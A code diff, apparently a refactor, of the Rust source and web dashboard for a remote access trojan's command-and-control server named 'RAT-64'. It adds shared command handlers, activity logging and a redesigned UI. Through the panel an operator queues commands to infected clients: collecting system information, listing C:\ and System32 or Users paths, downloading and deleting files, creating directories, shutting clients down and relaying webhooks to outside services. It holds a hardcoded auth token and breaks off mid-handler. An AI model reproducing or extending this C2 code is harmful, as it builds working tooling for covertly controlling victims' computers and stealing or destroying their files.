@@ -6,12 +6,12 @@ use http_body_util::{BodyExt, Full};
 use hyper::body::Incoming;
 use hyper::server::conn::http1;
 use hyper::service::service_fn;
-use hyper::{header::{HeaderValue, CONTENT_TYPE}, Method, Request, Response, StatusCode};
+use hyper::{header::CONTENT_TYPE, Method, Request, Response, StatusCode};
 use hyper_util::rt::TokioIo;
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use tokio::{net::TcpListener, sync::{Mutex, Notify}, time};
-use rat_64::core::config::{load_config_or_default, Config};
+
 
 const AUTH_TOKEN: &str = "SECURE_TOKEN_32_CHARS_MINIMUM_LEN";
 const PORT: u16 = 8080;
@@ -25,21 +25,159 @@ struct Command {
     auth_token: String,
 }
 
+#[derive(Serialize, Clone, Debug)]
+struct LogEntry {
+    timestamp: u64,
+    level: String,
+    message: String,
+    client_id: Option<String>,
+    command_id: Option<String>,
+    details: Option<Value>,
+}
+
 struct AppState {
     command_queue: Mutex<Vec<Command>>,
     response_log: Mutex<Vec<Value>>,
-    config: Arc<Config>,
+    activity_log: Mutex<Vec<LogEntry>>,
     notify: Notify,
 }
 
 fn unix_time() -> u64 { Utc::now().timestamp() as u64 }
 
+async fn log_activity(state: &AppState, level: &str, message: &str, client_id: Option<&str>, command_id: Option<&str>, details: Option<Value>) {
+    let entry = LogEntry {
+        timestamp: unix_time(),
+        level: level.to_string(),
+        message: message.to_string(),
+        client_id: client_id.map(str::to_string),
+        command_id: command_id.map(str::to_string),
+        details,
+    };
+    
+    let mut log = state.activity_log.lock().await;
+    log.push(entry);
+    
+    // 最新1000件まで保持
+    if log.len() > 1000 {
+        let excess = log.len() - 1000;
+        log.drain(0..excess);
+    }
+}
+
+async fn handle_simple_command(state: &AppState, prefix: &str, command_type: &str) -> Result<Response<Full<Bytes>>, Infallible> {
+    let id = format!("{}_{}", prefix, Utc::now().timestamp_millis());
+    let cmd = Command {
+        id: id.clone(),
+        command_type: command_type.to_string(),
+        parameters: vec![],
+        timestamp: unix_time(),
+        auth_token: AUTH_TOKEN.to_string(),
+    };
+    
+    state.command_queue.lock().await.push(cmd);
+    state.notify.notify_waiters();
+    
+    log_activity(state, "INFO", &format!("{} command queued", command_type), None, Some(&id), 
+                Some(json!({"command_type": command_type}))).await;
+    println!("[UI] {} command added: {}", command_type, id);
+    
+    Ok(json_response(json!({"ok": true}), StatusCode::OK))
+}
+
+async fn handle_file_command(state: &AppState, prefix: &str, command_type: &str, params: Vec<&str>) -> Result<Response<Full<Bytes>>, Infallible> {
+    let id = format!("{}_{}", prefix, Utc::now().timestamp_millis());
+    let cmd = Command {
+        id: id.clone(),
+        command_type: command_type.to_string(),
+        parameters: params.into_iter().map(String::from).collect(),
+        timestamp: unix_time(),
+        auth_token: AUTH_TOKEN.to_string(),
+    };
+    
+    state.command_queue.lock().await.push(cmd);
+    state.notify.notify_waiters();
+    println!("[UI] {} command added: {}", command_type, id);
+    
+    Ok(json_response(json!({"ok": true}), StatusCode::OK))
+}
+
+async fn extract_json_body(req: Request<Incoming>) -> Result<Value, String> {
+    let body = req.into_body().collect().await
+        .map_err(|_| "Failed to read body")?
+        .to_bytes();
+    
+    if body.is_empty() {
+        return Err("Empty body".to_string());
+    }
+    
+    serde_json::from_slice(&body)
+        .map_err(|_| "Invalid JSON".to_string())
+}
+
+async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operation: &str, command_type: &str) -> Result<Response<Full<Bytes>>, Infallible> {
+    match extract_json_body(req).await {
+        Ok(data) => {
+            if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
+                let id = format!("{}_{}", operation, Utc::now().timestamp_millis());
+                let params = match operation {
+                    "delete" => vec![path.to_string(), "false".to_string()],
+                    "create_dir" => vec![path.to_string(), "true".to_string()],
+                    _ => vec![path.to_string()],
+                };
+                
+                let cmd = Command {
+                    id: id.clone(),
+                    command_type: command_type.to_string(),
+                    parameters: params,
+                    timestamp: unix_time(),
+                    auth_token: AUTH_TOKEN.to_string(),
+                };
+                
+                state.command_queue.lock().await.push(cmd);
+                state.notify.notify_waiters();
+                println!("[UI] {} command added: {} (path: {})", operation, id, path);
+                Ok(json_response(json!({"ok": true}), StatusCode::OK))
+            } else {
+                Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
+            }
+        }
+        Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+    }
+}
+
+async fn handle_client_json_request<F>(
+    state: &AppState,
+    req: Request<Incoming>,  
+    processor: F,
+    response_status: &str
+) -> Result<Response<Full<Bytes>>, Infallible>
+where
+    F: FnOnce(Value) -> Value,
+{
+    match extract_json_body(req).await {
+        Ok(data) => {
+            let processed_data = processor(data);
+            
+            // レスポンス用のログでない場合はログに記録
+            if response_status != "received" {
+                state.response_log.lock().await.push(processed_data);
+            } else {
+                state.response_log.lock().await.push(processed_data.clone());
+            }
+            
+            Ok(json_response(json!({"status": response_status}), StatusCode::OK))
+        }
+        Err(_) => Ok(json_response(json!({"error": "No JSON data provided"}), StatusCode::BAD_REQUEST))
+    }
+}
+
 fn json_response(v: Value, status: StatusCode) -> Response<Full<Bytes>> {
     let body = serde_json::to_vec(&v).unwrap_or_else(|_| b"{}".to_vec());
-    let mut resp = Response::new(Full::new(Bytes::from(body)));
-    *resp.status_mut() = status;
-    resp.headers_mut().insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
-    resp
+    Response::builder()
+        .status(status)
+        .header(CONTENT_TYPE, "application/json")
+        .body(Full::new(Bytes::from(body)))
+        .unwrap()
 }
 
 fn unauthorized() -> Response<Full<Bytes>> {
@@ -64,49 +202,36 @@ fn log_request(method: &Method, endpoint: &str, remote: &SocketAddr, data: Optio
 }
 
 fn parse_query_param(req: &Request<Incoming>, key: &str) -> Option<String> {
-    req.uri().query().and_then(|q| {
-        for pair in q.split('&') {
-            let mut it = pair.splitn(2, '=');
-            let k = it.next()?;
-            let v = it.next().unwrap_or("");
-            if k == key { return Some(v.to_string()); }
-        }
-        None
-    })
+    req.uri().query()?.split('&')
+        .find_map(|pair| {
+            let mut parts = pair.splitn(2, '=');
+            match (parts.next()?, parts.next()) {
+                (k, Some(v)) if k == key => Some(v.to_string()),
+                (k, None) if k == key => Some(String::new()),
+                _ => None,
+            }
+        })
 }
 
 fn parse_query_bool(req: &Request<Incoming>, key: &str) -> bool {
-    match parse_query_param(req, key).as_deref() {
-        Some("1") | Some("true") | Some("yes") => true,
-        _ => false,
-    }
+    matches!(parse_query_param(req, key).as_deref(), Some("1" | "true" | "yes"))
 }
 
-fn parse_query_u64(req: &Request<Incoming>, key: &str, default_: u64) -> u64 {
-    parse_query_param(req, key).and_then(|v| v.parse::<u64>().ok()).unwrap_or(default_)
+fn parse_query_u64(req: &Request<Incoming>, key: &str, default: u64) -> u64 {
+    parse_query_param(req, key)
+        .and_then(|v| v.parse().ok())
+        .unwrap_or(default)
 }
 
 fn html_response(html: &str) -> Response<Full<Bytes>> {
-    let mut resp = Response::new(Full::new(Bytes::from(html.to_owned())));
-    *resp.status_mut() = StatusCode::OK;
-    resp.headers_mut().insert(
-        CONTENT_TYPE,
-        HeaderValue::from_static("text/html; charset=utf-8"),
-    );
-    // Cache無効化（UIの更新が即時反映されるように）
-    resp.headers_mut().insert(
-        hyper::header::CACHE_CONTROL,
-        HeaderValue::from_static("no-store, no-cache, must-revalidate, max-age=0"),
-    );
-    resp.headers_mut().insert(
-        hyper::header::PRAGMA,
-        HeaderValue::from_static("no-cache"),
-    );
-    resp.headers_mut().insert(
-        hyper::header::EXPIRES,
-        HeaderValue::from_static("0"),
-    );
-    resp
+    Response::builder()
+        .status(StatusCode::OK)
+        .header(CONTENT_TYPE, "text/html; charset=utf-8")
+        .header(hyper::header::CACHE_CONTROL, "no-store, no-cache, must-revalidate, max-age=0")
+        .header(hyper::header::PRAGMA, "no-cache")
+        .header(hyper::header::EXPIRES, "0")
+        .body(Full::new(Bytes::from(html.to_owned())))
+        .unwrap()
 }
 
 fn index_page(queue_size: usize, resp_count: usize) -> String {
@@ -117,75 +242,514 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
   <meta charset="utf-8" />
   <title>RAT-64 C2 Server (Debug)</title>
   <style>
-    body {{ font-family: Arial, sans-serif; margin: 24px; }}
-    .grid {{ display: grid; gap: 12px; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }}
-    button {{ padding: 10px 14px; font-size: 14px; cursor: pointer; }}
-    .card {{ border: 1px solid #ddd; padding: 16px; border-radius: 8px; }}
-    .small {{ color:#666; font-size: 12px; }}
+    body {{ 
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+      margin: 0; 
+      padding: 20px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      color: #333;
+    }}
+    .container {{
+      max-width: 1200px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 15px;
+      padding: 30px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+    }}
+    .header {{
+      text-align: center;
+      margin-bottom: 30px;
+      padding-bottom: 20px;
+      border-bottom: 2px solid #e0e0e0;
+    }}
+    .header h1 {{
+      margin: 0;
+      color: #4a5568;
+      font-size: 2.5em;
+      font-weight: 300;
+    }}
+    .status-bar {{
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #f8f9fa;
+      padding: 15px 20px;
+      border-radius: 10px;
+      margin-bottom: 25px;
+      border-left: 4px solid #28a745;
+    }}
+    .status-item {{
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }}
+    .status-badge {{
+      background: #28a745;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+    }}
+    .grid {{ 
+      display: grid; 
+      gap: 20px; 
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
+      margin-bottom: 30px;
+    }}
+    .card {{ 
+      background: white;
+      border: none;
+      padding: 25px; 
+      border-radius: 12px; 
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }}
+    .card:hover {{
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+    }}
+    .card h3 {{
+      margin: 0 0 20px 0;
+      color: #2d3748;
+      font-size: 1.3em;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }}
+    .card-icon {{
+      font-size: 1.5em;
+    }}
+    button {{ 
+      padding: 12px 18px; 
+      font-size: 14px; 
+      cursor: pointer;
+      border: none;
+      border-radius: 8px;
+      font-weight: 500;
+      transition: all 0.2s ease;
+      margin: 4px;
+      min-width: 120px;
+    }}
+    .btn-primary {{
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+    }}
+    .btn-primary:hover {{
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+    }}
+    .btn-success {{
+      background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
+      color: #2d3748;
+    }}
+    .btn-success:hover {{
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(86, 171, 47, 0.4);
+    }}
+    .btn-warning {{
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      color: white;
+    }}
+    .btn-warning:hover {{
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(240, 147, 251, 0.4);
+    }}
+    .btn-danger {{
+      background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+      color: white;
+    }}
+    .btn-danger:hover {{
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(255, 107, 107, 0.4);
+    }}
+    .input-group {{
+      display: flex;
+      gap: 10px;
+      margin: 10px 0;
+      align-items: center;
+    }}
+    .input-group input {{
+      flex: 1;
+      padding: 12px 16px;
+      border: 2px solid #e2e8f0;
+      border-radius: 8px;
+      font-size: 14px;
+      transition: border-color 0.2s ease;
+    }}
+    .input-group input:focus {{
+      outline: none;
+      border-color: #667eea;
+      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }}
+    .input-group label {{
+      min-width: 100px;
+      font-weight: 500;
+      color: #4a5568;
+    }}
+    .command-log {{
+      background: #1a202c;
+      color: #e2e8f0;
+      padding: 20px;
+      border-radius: 10px;
+      font-family: 'Consolas', 'Monaco', monospace;
+      font-size: 13px;
+      max-height: 400px;
+      overflow-y: auto;
+      margin-top: 20px;
+      border: 1px solid #2d3748;
+      line-height: 1.6;
+      white-space: pre-wrap;
+    }}
+    .command-log::-webkit-scrollbar {{
+      width: 8px;
+    }}
+    .command-log::-webkit-scrollbar-track {{
+      background: #2d3748;
+      border-radius: 4px;
+    }}
+    .command-log::-webkit-scrollbar-thumb {{
+      background: #4a5568;
+      border-radius: 4px;
+    }}
+    .command-log::-webkit-scrollbar-thumb:hover {{
+      background: #718096;
+    }}
+    .footer {{
+      text-align: center;
+      padding-top: 20px;
+      border-top: 1px solid #e2e8f0;
+      color: #718096;
+      font-size: 14px;
+    }}
+    .quick-actions {{
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin: 15px 0;
+    }}
+    .quick-actions button {{
+      min-width: auto;
+      padding: 8px 12px;
+      font-size: 13px;
+    }}
+    .status-badge.online {{
+      background: #28a745;
+    }}
+    .status-badge.offline {{
+      background: #dc3545;
+    }}
+    .toast {{
+      animation: slideIn 0.3s ease;
+    }}
+    @keyframes slideIn {{
+      from {{ transform: translateX(100%); opacity: 0; }}
+      to {{ transform: translateX(0); opacity: 1; }}
+    }}
+    button:disabled {{
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none !important;
+    }}
+    .card p {{
+      margin: 10px 0;
+      line-height: 1.5;
+    }}
   </style>
   <script>
-    function post(path, body) {{
+    let commandCount = 0;
+    let isOnline = false;
+    
+    function updateStatus() {{
+      fetch('/api/status')
+        .then(r => r.json())
+        .then(data => {{
+          isOnline = data.clients > 0;
+          document.getElementById('client-status').textContent = 
+            isOnline ? 'オンライン' : 'オフライン';
+          document.getElementById('client-status').className = 
+            'status-badge ' + (isOnline ? 'online' : 'offline');
+          document.getElementById('client-count').textContent = data.clients || 0;
+          document.getElementById('queue-count').textContent = data.queue || 0;
+          document.getElementById('log-count').textContent = data.logs || 0;
+        }})
+        .catch(() => {{
+          document.getElementById('client-status').textContent = 'エラー';
+          document.getElementById('client-status').className = 'status-badge offline';
+        }});
+    }}
+    
+    function updateLogs() {{
+      fetch('/api/logs?limit=50')
+        .then(r => r.json())
+        .then(data => {{
+          const logContainer = document.getElementById('command-log');
+          if (data.logs && data.logs.length > 0) {{
+            logContainer.innerHTML = data.logs.map(log => {{
+              const timestamp = new Date(log.timestamp * 1000).toLocaleTimeString('ja-JP');
+              const levelColor = {{
+                'INFO': '#28a745',
+                'HEARTBEAT': '#007bff', 
+                'WARNING': '#ffc107',
+                'ERROR': '#dc3545',
+                'SUCCESS': '#28a745'
+              }}[log.level] || '#6c757d';
+              
+              let message = `[${{timestamp}}] <span style="color: ${{levelColor}}; font-weight: bold;">${{log.level}}</span> ${{log.message}}`;
+              
+              if (log.client_id) {{
+                message += ` <span style="color: #6f42c1;">[Client: ${{log.client_id}}]</span>`;
+              }}
+              
+              if (log.command_id) {{
+                message += ` <span style="color: #fd7e14;">[Cmd: ${{log.command_id.substring(0, 8)}}...]</span>`;
+              }}
+              
+              return message;
+            }}).join('\n');
+            logContainer.scrollTop = logContainer.scrollHeight;
+          }}
+        }})
+        .catch(e => {{
+          console.error('Failed to fetch logs:', e);
+        }});
+    }}
+    
+    function showToast(message, type = 'info') {{
+      const toast = document.createElement('div');
+      toast.className = `toast toast-${{type}}`;
+      toast.textContent = message;
+      toast.style.cssText = `
+        position: fixed; top: 20px; right: 20px; z-index: 1000;
+        padding: 15px 20px; border-radius: 8px; color: white;
+        font-weight: 500; opacity: 0; transform: translateX(100%);
+        transition: all 0.3s ease;
+        background: ${{type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#007bff'}};
+      `;
+      document.body.appendChild(toast);
+      
+      setTimeout(() => {{
+        toast.style.opacity = '1';
+        toast.style.transform = 'translateX(0)';
+      }}, 100);
+      
+      setTimeout(() => {{
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateX(100%)';
+        setTimeout(() => document.body.removeChild(toast), 300);
+      }}, 3000);
+    }}
+    
+    function post(path, body, successMessage) {{
+      const button = event.target;
+      const originalText = button.textContent;
+      button.disabled = true;
+      button.textContent = '実行中...';
+      
       const opts = {{ method: 'POST' }};
       if (body !== undefined) {{
         opts.headers = {{ 'Content-Type': 'application/json' }};
         opts.body = JSON.stringify(body);
       }}
+      
       fetch(path, opts)
-        .then(_ => location.reload())
-        .catch(e => alert('POST failed: ' + e));
+        .then(response => {{
+          if (response.ok) {{
+            commandCount++;
+            showToast(successMessage || 'コマンドが送信されました', 'success');
+            addToLog(`[SENT] ${{path}} - ${{successMessage || 'Command sent'}}`);
+            updateStatus();
+          }} else {{
+            throw new Error(`HTTP ${{response.status}}`);
+          }}
+        }})
+        .catch(e => {{
+          showToast(`エラー: ${{e.message}}`, 'error');
+          addToLog(`[ERROR] ${{path}} - ${{e.message}}`);
+        }})
+        .finally(() => {{
+          button.disabled = false;
+          button.textContent = originalText;
+        }});
+    }}
+    
+    function addToLog(message) {{
+      const log = document.getElementById('command-log');
+      const timestamp = new Date().toLocaleTimeString();
+      log.innerHTML += `[${{timestamp}}] ${{message}}\n`;
+      log.scrollTop = log.scrollHeight;
+    }}
+    
+    function clearLog() {{
+      fetch('/api/logs/clear', {{ method: 'POST' }})
+        .then(response => {{
+          if (response.ok) {{
+            document.getElementById('command-log').innerHTML = ''; 
+            showToast('サーバーログをクリアしました', 'success');
+            updateLogs(); // ログを再読み込み
+          }} else {{
+            showToast('ログクリアに失敗しました', 'error');
+          }}
+        }})
+        .catch(e => {{
+          document.getElementById('command-log').innerHTML = '';
+          showToast('ローカルログをクリアしました', 'info');
+        }});
     }}
     
     function fileInfo() {{
-      const path = document.getElementById('file_path').value;
-      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
-      post('/ui/add-file-info', {{ path: path }});
+      const path = document.getElementById('file_path').value.trim();
+      if (!path) {{ 
+        showToast('ファイルパスを入力してください', 'error'); 
+        return; 
+      }}
+      post('/ui/add-file-info', {{ path: path }}, `ファイル情報取得: ${{path}}`);
     }}
     
     function downloadFile() {{
-      const path = document.getElementById('file_path').value;
-      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
-      post('/ui/add-download-file', {{ path: path }});
+      const path = document.getElementById('file_path').value.trim();
+      if (!path) {{ 
+        showToast('ファイルパスを入力してください', 'error'); 
+        return; 
+      }}
+      post('/ui/add-download-file', {{ path: path }}, `ファイルダウンロード: ${{path}}`);
     }}
     
     function deleteFile() {{
-      const path = document.getElementById('file_path').value;
-      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
-      if (!confirm('本当に削除しますか？: ' + path)) return;
-      post('/ui/add-delete-file', {{ path: path }});
+      const path = document.getElementById('file_path').value.trim();
+      if (!path) {{ 
+        showToast('ファイルパスを入力してください', 'error'); 
+        return; 
+      }}
+      if (!confirm(`本当に削除しますか？\n\n${{path}}`)) return;
+      post('/ui/add-delete-file', {{ path: path }}, `ファイル削除: ${{path}}`);
     }}
     
     function createDir() {{
-      const path = document.getElementById('dir_path').value;
-      if (!path) {{ alert('ディレクトリパスを入力してください'); return; }}
-      post('/ui/add-create-dir', {{ path: path }});
+      const path = document.getElementById('dir_path').value.trim();
+      if (!path) {{ 
+        showToast('ディレクトリパスを入力してください', 'error'); 
+        return; 
+      }}
+      post('/ui/add-create-dir', {{ path: path }}, `ディレクトリ作成: ${{path}}`);
     }}
+    
+    function quickPath(path) {{
+      document.getElementById('file_path').value = path;
+      showToast(`パスを設定: ${{path}}`, 'info');
+    }}
+    
+    // 初期化
+    document.addEventListener('DOMContentLoaded', function() {{
+      updateStatus();
+      updateLogs();
+      setInterval(updateStatus, 5000); // 5秒ごとにステータス更新
+      setInterval(updateLogs, 3000);   // 3秒ごとにログ更新
+      addToLog('RAT-64 C2 Server WebUI 初期化完了');
+    }});
   </script>
 </head>
 <body>
-  <h1>RAT-64 C2 Server (Debug)</h1>
-  <p class="small">Queue: {queue} / Responses: {resp}</p>
-  <div class="grid">
-    <div class="card">
-      <h3>コマンド投入</h3>
-      <button type="button" onclick="post('/ui/add-status')">Add Status</button>
-      <button type="button" onclick="post('/ui/add-ping')">Add Ping</button>
-      <button type="button" onclick="post('/ui/add-collect')">Add Collect System Info</button>
-      <button type="button" onclick="post('/ui/add-shutdown')">Add Shutdown</button>
+  <div class="container">
+    <div class="header">
+      <h1>🐀 RAT-64 C2 Command Center</h1>
     </div>
-    <div class="card">
-      <h3>ファイル管理</h3>
-      <button type="button" onclick="post('/ui/add-list-files')">📁 List Files (Current Dir)</button>
-      <button type="button" onclick="post('/ui/add-list-files-win')">🪟 List Files (C:\\)</button>
-      <input type="text" id="file_path" placeholder="ファイルパス..." style="width: 200px; margin: 5px;">
-      <button type="button" onclick="fileInfo()">📄 File Info</button>
-      <button type="button" onclick="downloadFile()">⬇️ Download File</button>
-      <button type="button" onclick="deleteFile()">🗑️ Delete File</button>
-      <input type="text" id="dir_path" placeholder="ディレクトリパス..." style="width: 200px; margin: 5px;">
-      <button type="button" onclick="createDir()">📂 Create Directory</button>
+    
+    <div class="status-bar">
+      <div class="status-item">
+        <strong>クライアント状態:</strong>
+        <span id="client-status" class="status-badge">確認中...</span>
+      </div>
+      <div class="status-item">
+        <strong>接続数:</strong>
+        <span id="client-count">0</span>
+      </div>
+      <div class="status-item">
+        <strong>キュー:</strong>
+        <span id="queue-count">{queue}</span>
+      </div>
+      <div class="status-item">
+        <strong>レスポンス:</strong>
+        <span>{resp}</span>
+      </div>
+      <div class="status-item">
+        <strong>ログ:</strong>
+        <span id="log-count">0</span>
+      </div>
     </div>
+
+    <div class="grid">
+      <div class="card">
+        <h3><span class="card-icon"></span>基本コマンド</h3>
+        <button type="button" class="btn-primary" onclick="post('/ui/add-status', null, 'ステータス確認コマンド送信')">Status Check</button>
+        <button type="button" class="btn-primary" onclick="post('/ui/add-ping', null, 'Pingコマンド送信')">Ping Test</button>
+        <button type="button" class="btn-success" onclick="post('/ui/add-collect', null, 'システム情報収集開始')">Collect System Info</button>
+        <button type="button" class="btn-danger" onclick="post('/ui/add-shutdown', null, 'シャットダウンコマンド送信')">Shutdown</button>
+      </div>
+
+      <div class="card">
+        <h3><span class="card-icon"></span>ファイル管理</h3>
+        
+        <div style="margin-bottom: 15px;">
+          <button type="button" class="btn-success" onclick="post('/ui/add-list-files', null, 'カレントディレクトリ一覧取得')">Current Directory</button>
+          <button type="button" class="btn-success" onclick="post('/ui/add-list-files-win', null, 'C:\\ ドライブ一覧取得')">C:\\ Drive</button>
+        </div>
+
+        <div class="quick-actions">
+          <strong>クイックパス:</strong>
+          <button type="button" class="btn-primary" onclick="quickPath('C:\Windows\System32')">System32</button>
+          <button type="button" class="btn-primary" onclick="quickPath('C:\Users')">Users</button>
+          <button type="button" class="btn-primary" onclick="quickPath('C:\Program Files')">Program Files</button>
+          <button type="button" class="btn-primary" onclick="quickPath('C:\Temp')">Temp</button>
+        </div>
+
+        <div class="input-group">
+          <label>ファイルパス:</label>
+          <input type="text" id="file_path" placeholder="例: C:\Windows\notepad.exe">
+        </div>
+        
+        <div style="margin: 10px 0;">
+          <button type="button" class="btn-primary" onclick="fileInfo()">File Info</button>
+          <button type="button" class="btn-success" onclick="downloadFile()">⬇Download</button>
+          <button type="button" class="btn-danger" onclick="deleteFile()">Delete</button>
+        </div>
+
+        <div class="input-group">
+          <label>ディレクトリ:</label>
+          <input type="text" id="dir_path" placeholder="例: C:\NewFolder">
+        </div>
+        
+        <button type="button" class="btn-success" onclick="createDir()">Create Directory</button>
+      </div>
+
+      <div class="card">
+        <h3><span class="card-icon"></span>Webhook</h3>
+        <button type="button" class="btn-warning" onclick="post('/ui/queue-webhook', null, 'Webhook送信コマンド投入')">Send Webhook</button>
+        <p style="margin-top: 15px; color: #666; font-size: 14px;">
+          クライアント経由でWebhookを送信します。Discord等の外部サービスに通知を送信できます。
+        </p>
+      </div>
+    </div>
+
     <div class="card">
-      <h3>Webhook</h3>
-      <button type="button" onclick="post('/ui/queue-webhook')">今すぐ送信（クライアント経由）</button>
+      <h3><span class="card-icon"></span>コマンドログ</h3>
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+        <span style="color: #666;">リアルタイムコマンド実行ログ</span>
+        <button type="button" class="btn-primary" onclick="clearLog()">Clear Log</button>
+      </div>
+      <div id="command-log" class="command-log">
+        起動中... ログの初期化を待機しています。
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>RAT-64 C2 Server v2.0 | Secure Command & Control Interface</p>
+      <p style="font-size: 12px; margin-top: 10px;">
+        このインターフェースは認証不要のデバッグ用途です。本番環境では適切な認証を実装してください。
+      </p>
     </div>
   </div>
   <p class="small">このページの操作は認証不要（デバッグ用途）。クライアントAPIはBearer認証が必要です。</p>
@@ -219,151 +783,25 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             }), StatusCode::OK))
         }
 
-        // UI buttons (no auth) ------------------------------------------
-        (Method::POST, "/ui/add-status") => {
-            let id = format!("status_{}", Utc::now().timestamp_millis());
-            let cmd = Command { id: id.clone(), command_type: "status".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-            state.command_queue.lock().await.push(cmd.clone());
-            state.notify.notify_waiters();
-            println!("[UI] Status command added: {}", id);
-            Ok(json_response(json!({"ok": true}), StatusCode::OK))
-        }
-        (Method::POST, "/ui/add-ping") => {
-            let id = format!("ping_{}", Utc::now().timestamp_millis());
-            let cmd = Command { id: id.clone(), command_type: "ping".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-            state.command_queue.lock().await.push(cmd.clone());
-            state.notify.notify_waiters();
-            println!("[UI] Ping command added: {}", id);
-            Ok(json_response(json!({"ok": true}), StatusCode::OK))
-        }
-        (Method::POST, "/ui/add-collect") => {
-            let id = format!("collect_{}", Utc::now().timestamp_millis());
-            let cmd = Command { id: id.clone(), command_type: "collect_system_info".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-            state.command_queue.lock().await.push(cmd.clone());
-            state.notify.notify_waiters();
-            println!("[UI] CollectSystemInfo command added: {}", id);
-            Ok(json_response(json!({"ok": true}), StatusCode::OK))
-        }
-        (Method::POST, "/ui/add-shutdown") => {
-            let id = format!("shutdown_{}", Utc::now().timestamp_millis());
-            let cmd = Command { id: id.clone(), command_type: "shutdown".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-            state.command_queue.lock().await.push(cmd.clone());
-            state.notify.notify_waiters();
-            println!("[UI] Shutdown command added: {}", id);
-            Ok(json_response(json!({"ok": true}), StatusCode::OK))
-        }
+        // 基本コマンド（認証不要）
+        (Method::POST, "/ui/add-status") => handle_simple_command(&state, "status", "status").await,
+        (Method::POST, "/ui/add-ping") => handle_simple_command(&state, "ping", "ping").await,
+        (Method::POST, "/ui/add-collect") => handle_simple_command(&state, "collect", "collect_system_info").await,
+        (Method::POST, "/ui/add-shutdown") => handle_simple_command(&state, "shutdown", "shutdown").await,
 
-        // ファイル管理コマンド
-        (Method::POST, "/ui/add-list-files") => {
-            let id = format!("list_files_{}", Utc::now().timestamp_millis());
-            let cmd = Command { id: id.clone(), command_type: "list_files".into(), parameters: vec![".".to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-            state.command_queue.lock().await.push(cmd.clone());
-            state.notify.notify_waiters();
-            println!("[UI] List files command added: {}", id);
-            Ok(json_response(json!({"ok": true}), StatusCode::OK))
-        }
-        (Method::POST, "/ui/add-list-files-win") => {
-            let id = format!("list_files_win_{}", Utc::now().timestamp_millis());
-            let cmd = Command { id: id.clone(), command_type: "list_files".into(), parameters: vec!["C:\\".to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-            state.command_queue.lock().await.push(cmd.clone());
-            state.notify.notify_waiters();
-            println!("[UI] List files (C:\\) command added: {}", id);
-            Ok(json_response(json!({"ok": true}), StatusCode::OK))
-        }
-        (Method::POST, "/ui/add-file-info") => {
-            let body = match req.into_body().collect().await {
-                Ok(collected) => collected.to_bytes(),
-                Err(_) => Bytes::new(),
-            };
-            match serde_json::from_slice::<serde_json::Value>(&body) {
-                Ok(data) => {
-                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
-                        let id = format!("file_info_{}", Utc::now().timestamp_millis());
-                        let cmd = Command { id: id.clone(), command_type: "get_file_info".into(), parameters: vec![path.to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-                        state.command_queue.lock().await.push(cmd.clone());
-                        state.notify.notify_waiters();
-                        println!("[UI] File info command added: {} (path: {})", id, path);
-                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
-                    } else {
-                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
-                    }
-                }
-                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
-            }
-        }
-        (Method::POST, "/ui/add-download-file") => {
-            let body = match req.into_body().collect().await {
-                Ok(collected) => collected.to_bytes(),
-                Err(_) => Bytes::new(),
-            };
-            match serde_json::from_slice::<serde_json::Value>(&body) {
-                Ok(data) => {
-                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
